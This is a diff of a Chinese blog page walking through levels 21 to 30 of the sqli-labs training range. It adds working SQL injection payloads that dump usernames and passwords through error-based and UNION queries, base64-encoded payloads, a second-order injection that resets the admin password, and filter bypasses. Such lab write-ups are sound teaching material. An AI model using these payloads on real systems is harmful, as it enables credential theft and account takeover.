@@ -16,12 +16,12 @@
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
   
-    <meta name="description" content="less-1 判断出id&#x3D;1是注入点，且他是以&#39;闭合，先使用order by判断字段数，再进行sql注入。 判断字段：   经行联合查询： 12345union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;database()-- -    &#x2F;&#x2F;查询当前">
+    <meta name="description" content="基本注入less-1 判断出id&#x3D;1是注入点，且他是以&#39;闭合，先使用order by判断字段数，再进行sql注入。 判断字段：   经行联合查询： 12345union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;database()-- -    &#x2F;&#x2F;">
 <meta property="og:type" content="article">
 <meta property="og:title" content="sqli靶场通关教程">
 <meta property="og:url" content="http://example.com/2023/12/24/sqli%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="less-1 判断出id&#x3D;1是注入点，且他是以&#39;闭合，先使用order by判断字段数，再进行sql注入。 判断字段：   经行联合查询： 12345union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;database()-- -    &#x2F;&#x2F;查询当前">
+<meta property="og:description" content="基本注入less-1 判断出id&#x3D;1是注入点，且他是以&#39;闭合，先使用order by判断字段数，再进行sql注入。 判断字段：   经行联合查询： 12345union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;database()-- -    &#x2F;&#x2F;">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-21_15-56-20.png">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E5%AD%97%E6%AE%B5%E6%95%B0%E5%A4%AA%E5%A4%A7%E6%8A%A5%E9%94%99.png">
@@ -69,8 +69,87 @@
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-24_21-05-24.png">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-24_21-17-15.png">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-24_21-33-57.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-25_09-46-10.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-25_09-56-37.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-25_10-01-55.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-25_10-27-21.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-25_10-33-13.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-25_10-38-41.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-25_10-39-25.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-25_10-41-38.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-25_10-45-15.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-25_10-56-56.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-25_10-59-13.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-25_11-00-25.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-25_11-15-07.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-25_15-38-08.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-25_11-31-59.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-26_14-47-38.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-25_15-30-13.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-25_15-45-24.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-25_16-52-00.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-25_16-57-11.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-25_17-19-03.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-25_17-24-42.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-25_17-26-07.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imge7a44bc3e4174ca1a1984d1a0b1481c7.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-25_19-07-48.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-25_19-10-33.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-25_19-19-52.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-25_19-39-43.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-25_19-54-37.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-25_20-00-57.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-25_20-05-04.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-25_20-08-47.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img297af58826ab4ef18e9118df55757229.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-25_20-25-54.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-25_20-29-02.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-25_20-41-03.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-25_20-42-52.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-25_21-07-59.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-25_21-10-45.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-25_21-13-51.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-26_14-03-42.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-26_14-04-49.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-26_19-20-37.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-26_19-28-21.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-26_19-30-08.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-26_19-32-10.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-26_19-36-36.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-26_20-21-59.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-26_20-33-49.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-26_20-37-19.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-26_20-38-43.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-26_20-39-35.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-26_20-41-47.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-26_20-59-28.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-26_21-03-33.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-27_10-43-03.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-27_10-48-45.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-27_10-53-42.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-27_10-54-18.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-27_11-06-07.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-27_11-06-41.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-27_11-14-04.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-27_11-15-52.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-27_11-18-51.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-27_11-25-00.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-27_11-30-33.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-27_11-36-45.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-27_11-40-18.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-27_11-41-56.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-27_11-42-25.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-27_17-15-57.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-27_17-16-28.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgimage-20231227172925810.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgimage-20231227172945470.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgimage-20231227190311827.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-27_19-54-29.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-27_20-36-21.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-27_20-46-29.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-27_20-51-09.png">
 <meta property="article:published_time" content="2023-12-24T01:18:52.000Z">
-<meta property="article:modified_time" content="2023-12-24T13:34:43.800Z">
+<meta property="article:modified_time" content="2023-12-29T02:09:17.875Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="sql注入">
 <meta name="twitter:card" content="summary_large_image">
@@ -267,7 +346,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          5.6k 字
+          16k 字
         
       </span>
     
@@ -278,7 +357,7 @@
         
         
         
-          47 分钟
+          137 分钟
         
       </span>
     
@@ -320,7 +399,7 @@
             
               <div class="markdown-body">
                 
-                <h3 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h3><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-21_15-56-20.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2023-12-21_15-56-20"></p>
+                <h2 id="基本注入"><a href="#基本注入" class="headerlink" title="基本注入"></a>基本注入</h2><h3 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h3><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-21_15-56-20.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2023-12-21_15-56-20"></p>
 <p>判断出id&#x3D;1是注入点，且他是以<code>&#39;</code>闭合，先使用<code>order by</code>判断字段数，再进行sql注入。</p>
 <p>判断字段：</p>
 <p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E5%AD%97%E6%AE%B5%E6%95%B0%E5%A4%AA%E5%A4%A7%E6%8A%A5%E9%94%99.png" srcset="/img/loading.gif" lazyload alt="字段数太大报错"></p>
@@ -428,12 +507,290 @@
 
 
 
-<h3 id="less-21"><a href="#less-21" class="headerlink" title="less-21"></a>less-21</h3><p>本关和less-20很像只是编码方式不同，less-21是使用base64编码。可以在后方输入单引号并编码，会报错还需要加括号。</p>
+<h2 id="高级注入"><a href="#高级注入" class="headerlink" title="高级注入"></a>高级注入</h2><h3 id="less-21"><a href="#less-21" class="headerlink" title="less-21"></a>less-21</h3><p>本关和less-20很像只是编码方式不同，less-21是使用base64编码。可以在后方输入单引号并编码，会报错还需要加括号。</p>
 <p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-24_21-17-15.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2023-12-24_21-17-15"></p>
-<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">&#x27;)and updatexml (1,concat(0x5c,(<span class="hljs-keyword">select</span> group_concat(username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> users),<span class="hljs-number">0x5c</span>),<span class="hljs-number">1</span>)-- -<br><br><span class="hljs-built_in">base64</span>编码：<br>nKWFuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHg1Yywoc2VsZWN0IGdyb3VwX2NvbmNhdCh1c2VybmFtZSxwYXNzd29yZCkgZnJvbSB1c2VycyksMHg1YyksMSktLSAt<br><br><br></code></pre></td></tr></table></figure>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">admin</span>&#x27;)and updatexml (<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x5c,(select group_concat(username,password) from users),<span class="hljs-number">0</span>x5c),<span class="hljs-number">1</span>)-- -<br><br><span class="hljs-attribute">base64</span>编码：<br><span class="hljs-attribute">nKWFuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHg1Yywoc2VsZWN0IGdyb3VwX2NvbmNhdCh1c2VybmFtZSxwYXNzd29yZCkgZnJvbSB1c2VycyksMHg1YyksMSktLSAt</span><br><br><br></code></pre></td></tr></table></figure>
 
 <p>报错注入再base64编码就能看到数据了。</p>
 <p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-24_21-33-57.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2023-12-24_21-33-57"></p>
+<h3 id="less-22"><a href="#less-22" class="headerlink" title="less-22"></a>less-22</h3><p>使用<code>&quot;</code>进行base64编码，发现报错：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-25_09-46-10.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2023-12-25_09-46-10"></p>
+<p>再使用<code>&quot;-- -</code>进行base64编码，发现语句成功执行，数据库报错，可以使用报错注入。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-25_09-56-37.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2023-12-25_09-56-37"></p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">admin&quot;and updatexml (1,concat(0x5c,(<span class="hljs-keyword">select</span> group_concat(username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> users),<span class="hljs-number">0x5c</span>),<span class="hljs-number">1</span>)-- -<br><br><br><span class="hljs-built_in">base64</span>编码：<br>YWRtaW4iYW5kIHVwZGF0ZXhtbCAoMSxjb25jYXQoMHg1Yywoc2VsZWN0IGdyb3VwX2NvbmNhdCh1c2VybmFtZSxwYXNzd29yZCkgZnJvbSB1c2VycyksMHg1YyksMSktLSAt<br><br></code></pre></td></tr></table></figure>
+
+<p><strong>注意：在进行base64编码时需要将所有数据都进行编码否则可能报错。</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-25_10-01-55.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2023-12-25_10-01-55"></p>
+<h3 id="less-23"><a href="#less-23" class="headerlink" title="less-23"></a>less-23</h3><p>将id赋值为1，可以看出页面正常输出。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-25_10-27-21.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2023-12-25_10-27-21"></p>
+<p>而使用注释符确会报错。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-25_10-33-13.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2023-12-25_10-33-13"></p>
+<p>所以不能使用注释符，需要判断有几个输出的字段，再进行sql注入。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-25_10-38-41.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2023-12-25_10-38-41"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-25_10-39-25.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2023-12-25_10-39-25"></p>
+<p>看出有3个字段</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-25_10-41-38.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2023-12-25_10-41-38"></p>
+<p>只有第二个和第三个字段是可视字段。进行联合查询。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-25_10-45-15.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2023-12-25_10-45-15"></p>
+<p><strong>注意：由于不能使用注释符所以在变量外面还有一个单引号，所以在数据结尾还需要加<code>&#39;</code>进行闭合。</strong></p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">?id=0&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> group_concat(id,<span class="hljs-string">&quot;~&quot;</span>,username,<span class="hljs-string">&quot;~&quot;</span>,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> users)<span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="less-24"><a href="#less-24" class="headerlink" title="less-24"></a>less-24</h3><p>使用二次注入。</p>
+<p>新注册一个已有账号的后方进行注释的账号，如我注册一个名为<code>admin&#39;-- -</code>的账号，密码为123，然后登录<code>admin&#39;-- -</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-25_10-56-56.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2023-12-25_10-56-56"></p>
+<p>更改<code>admin&#39;-- -</code>的密码，由于将代码后方的语句都注释了，所以修改的是<code>admin</code>的密码</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-25_10-59-13.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2023-12-25_10-59-13"></p>
+<p>登录<code>admin</code>账号，密码为123</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-25_11-00-25.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2023-12-25_11-00-25"></p>
+<h3 id="less-25"><a href="#less-25" class="headerlink" title="less-25"></a>less-25</h3><p>使用本关会将输入的字符串中的<code>or</code>和<code>and</code>都过滤，但是其他的不会过滤，可以利用联合查询进行注入，并且在注入语句中不能有<code>or</code>和<code>and</code>否则无法正确查询。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-25_11-15-07.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2023-12-25_11-15-07"></p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">?<span class="hljs-built_in">id</span>=<span class="hljs-number">-2</span>&#x27; union select <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">id</span>,<span class="hljs-string">&quot;~&quot;</span>,username,<span class="hljs-string">&quot;~&quot;</span>,passwoorrd),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> users<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>
+
+<p>可以使用重写<code>or</code>将<code>or</code>显示出来。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-25_15-38-08.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2023-12-25_15-38-08"></p>
+<h3 id="less-26"><a href="#less-26" class="headerlink" title="less-26"></a>less-26</h3><p>由于本关会将语句中所有的空格和注释过滤，所以在注入时不能使用它们。这里我考虑用报错注入，因为报错注入所使用的空格较少。可以使用符号<code>&amp;&amp;和||</code>代替<code>and</code>和<code>or</code>以减少空格。</p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&#x27;||(updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(select(group_concat(passwoorrd,username))<span class="hljs-keyword">from</span>(users))),<span class="hljs-number">1</span>))||&#x27;<span class="hljs-number">0</span> <br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-25_11-31-59.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2023-12-25_11-31-59"></p>
+<p>可以将需要用到的表名，列名括起来。</p>
+<h3 id="less-26a"><a href="#less-26a" class="headerlink" title="less-26a"></a>less-26a</h3><p>本关将<code>or和and</code>过滤了，且不显示报错，不能进行报错注入，闭合是<code>(&#39;&#39;)</code>。直接使用联合查询进行暴库。</p>
+<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">?id=<span class="hljs-number">0</span>&#x27;)union%<span class="hljs-number">0bselect</span><span class="hljs-symbol">%</span><span class="hljs-number">0b1</span>,(select(group_concat(username,passwoorrd))from(users)),<span class="hljs-number">3</span><span class="hljs-symbol">%</span><span class="hljs-number">0b</span>||(&#x27;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+
+<img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-26_14-47-38.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2023-12-26_14-47-38"  />
+
+
+
+<h3 id="less-27"><a href="#less-27" class="headerlink" title="less-27"></a>less-27</h3><p>本关将<code>union和select</code>注释掉了没有将<code>or和and</code>注释掉，所以不能直接使用<code>union和select</code>，但是我们可以通过大小写和重写绕过过滤。</p>
+<p><strong>注意：需要使用<code>&#39;</code>和后方的<code>&#39;</code>进行闭合。</strong></p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&#x27;<span class="hljs-keyword">or</span>(updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(selselecselecttect(group_concat(username,password))<span class="hljs-keyword">from</span>(users)),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>))<span class="hljs-keyword">or</span>&#x27;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-25_15-30-13.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2023-12-25_15-30-13"></p>
+<p>也可以在中间写大写：</p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&#x27;<span class="hljs-keyword">or</span>(updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(selSELECTect(group_concat(username,password))<span class="hljs-keyword">from</span>(users)),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>))<span class="hljs-keyword">or</span>&#x27;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-25_15-45-24.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2023-12-25_15-45-24"></p>
+<h3 id="less-28"><a href="#less-28" class="headerlink" title="less-28"></a>less-28</h3><p>本关不显示sql报错，所以不能用报错注入。因为过滤了<code>select和union</code>过滤了，需要进行绕过。</p>
+<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">?id=<span class="hljs-number">0</span>&#x27;)union%<span class="hljs-number">0bselect</span><span class="hljs-symbol">%</span><span class="hljs-number">0b1</span>,(select %0bgroup_concat(id,username,password) from%<span class="hljs-number">0b</span> users),<span class="hljs-number">3</span>||(&#x27;<br></code></pre></td></tr></table></figure>
+
+<p><code>%0b</code>防止过滤，使用<code>(&#39;&#39;)</code>闭合。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-25_16-52-00.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2023-12-25_16-52-00"></p>
+<h3 id="less-29"><a href="#less-29" class="headerlink" title="less-29"></a>less-29</h3><p>二十九关就是会对输入的参数进行校验是否为数字，但是在对参数值进行校验之前的提取时候只提取了第一个id值，如果我们有两个id参数，第一个id参数正常数字，第二个id参数进行sql注入。sql语句在接受相同参数时候接受的是后面的参数值。</p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">?<span class="hljs-built_in">id</span>=<span class="hljs-number">0</span>&#x27; union select <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">id</span>,<span class="hljs-string">&quot;~&quot;</span>,username,<span class="hljs-string">&quot;~&quot;</span>,password),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> users<span class="hljs-comment">-- -</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-25_16-57-11.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2023-12-25_16-57-11"></p>
+<p>只需要直接进行联合查询选择好爆破的位置就能正确爆破。</p>
+<h3 id="less-30"><a href="#less-30" class="headerlink" title="less-30"></a>less-30</h3><p>本关和less-29基本一致，只是将<code>&#39;&#39;</code>闭合变成了<code>&quot;&quot;</code>闭合。</p>
